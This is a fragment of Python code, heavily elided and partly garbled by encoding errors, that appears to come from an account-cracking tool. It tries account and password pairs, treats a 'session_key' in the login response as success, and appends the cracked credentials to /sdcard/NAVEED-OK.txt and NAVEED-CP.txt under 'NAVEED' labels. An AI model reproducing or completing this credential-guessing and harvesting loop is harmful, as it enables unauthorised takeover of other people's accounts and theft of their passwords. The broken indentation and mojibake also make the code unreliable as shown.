...
def method():
    ...
    print(f"{oo('â€¢')}/sdcard/NAVEED-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mNAVEED-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92mâ€¢\033[1;97m '+pword+'  ')
                open('/sdcard/NAVEED-OK.txt','a').write(f'{acc} â€¢ {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mNAVEED-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91mâ€¢\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/NAVEED-CP.txt','a').write(f'{acc} â€¢ {pword}\n')
                break
            else:
                continue
        loop += 1
